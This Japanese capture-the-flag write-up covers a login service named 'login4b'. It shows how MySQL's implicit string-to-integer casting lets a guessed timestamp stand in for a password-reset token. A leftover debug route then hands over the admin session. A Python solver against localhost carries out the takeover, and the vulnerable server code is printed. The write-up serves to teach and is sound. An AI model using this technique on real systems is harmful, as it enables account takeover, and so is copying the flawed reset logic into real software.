# login4b

login, register, reset passwordができるサービスで、adminでログインしたらフラグが表示されます。

```ts
app.get("/api/get_flag", (req: Request, res: Response) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: "Not authenticated" });
  }

  if (req.session.username === "admin") {
    res.json({ flag: process.env.FLAG || "ctf4B{**REDACTED**}" });
  } else {
    res.json({ message: "Hello user! Only admin can see the flag." });
  }
});
```

## 解法

sessionを偽造したりすることは基本的に難しいので、他の方法でadminのセッション情報を取得することを目指します。そこで、`/api/reset-password`に着目すると、パスワードリセット機能が実装されておらず、代わりにリセットが成功したユーザのセッション情報を返しています。これを利用して、adminのセッション情報を取得します。

```ts
// TODO: implement
// await db.updatePasswordByUsername(username, newPassword);

// TODO: remove this
const user = await db.findUser(username);
if (!user) {
    return res.status(401).json({ error: "Invalid username" });
}
req.session.userId = user.userid;
req.session.username = user.username;
```

しかし、パスワードリセットを成功させるには、リセットトークンを用意し、リクエストボディに入れる必要があります。リセットトークンは`/api/reset-request`で生成されますが、ユーザに返されることはありません(本来はメールなどで送信されますが、この機能も未実装になっています)。

パスワードリセット機能のリセットトークンの検証をバイパスすることを目指します。リセットトークンの検証は`db.validateResetTokenByUsername`関数で行われています。

```ts
async validateResetTokenByUsername(
  username: string,
  token: string
): Promise<boolean> {
  await this.initialized;
  const [rows] = (await this.pool.execute(
    "SELECT COUNT(*) as count FROM users WHERE username = ? AND reset_token = ?",
    [username, token]
  )) as [any[], mysql.FieldPacket[]];
  return rows[0].count > 0;
}
```

`db.validateResetTokenByUsername`関数では`username`と`token`を用いて、`users`テーブルの`reset_token`が一致するカラムがあるかどうかを確認しています。

また、`token`はこのように生成されています。

```ts
async generateResetToken(userid: number): Promise<string> {
  await this.initialized;
  const timestamp = Math.floor(Date.now() / 1000);
  const token = `${timestamp}_${uuidv4()}`;

  await this.pool.execute(
    "UPDATE users SET reset_token = ? WHERE userid = ?",
    [token, userid]
  );
  return token;
}
```

つまり、`token`のフォーマットは`timestamp_uuid`となっています。

ここで、mysqlの暗黙的な型キャストによる仕様を利用します。少し非自明かもしれませんが、MySQLでは以下のような挙動をします。

```sql
SELECT "1234567890_53cr37_t0k3n" = 1234567890; # => true
```

`token`の先頭の値は`timestamp`となっているので、`timestamp`を推測することができれば、`token`を作成することができます。`timestamp`は`generateResetToken`関数が実行されたタイミングなので、
`validateResetTokenByUsername`関数を実行する直前で、`generateResetToken`関数を実行すれば`token`を推測することができます。

## Solver

```python
# 注意: ネットワーク環境によってはこのsolverが動かないことがあります。その場合は'token': int(time.time())の値を調整してください。
import requests
import time

ENDPOINT = 'http://localhost' # 環境に合わせて変更してください

headers = {
    'Accept': '*/*',
    'Content-Type': 'application/json',
}

data = {
    'username': 'admin',
    'token': int(time.time()),
    'newPassword': 'testtesttest'
}
print("token:", data['token'])

response = requests.post( f'{ENDPOINT}/api/reset-request', headers=headers, json=data)
response = requests.post( f'{ENDPOINT}/api/reset-password', headers=headers, json=data)

if response.status_code == 200:
    session_cookies = response.cookies.get_dict()
    print("Session Cookies:", session_cookies)

    flag_response = requests.get(f'{ENDPOINT}/api/get_flag', cookies=session_cookies)

    if flag_response.status_code == 200:
        print("Flag Response:", flag_response.text)
    else:
        print("Failed to retrieve flag:", flag_response.status_code)
else:
    print("Failed to reset password:", response.status_code)
```
